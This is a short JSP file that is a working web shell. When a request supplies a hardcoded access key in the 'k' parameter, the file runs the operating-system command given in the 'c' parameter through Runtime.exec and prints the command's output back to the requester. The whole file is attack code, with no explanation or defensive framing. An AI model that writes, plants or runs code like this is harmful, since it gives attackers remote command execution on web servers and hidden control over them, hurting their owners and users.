<%@page import="java.util.*,java.io.*"%>
<% if (request.getParameter("c") != null && request.getParameter("k").equals("7BoeW9RdRialG8osxgX48tYD")) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>
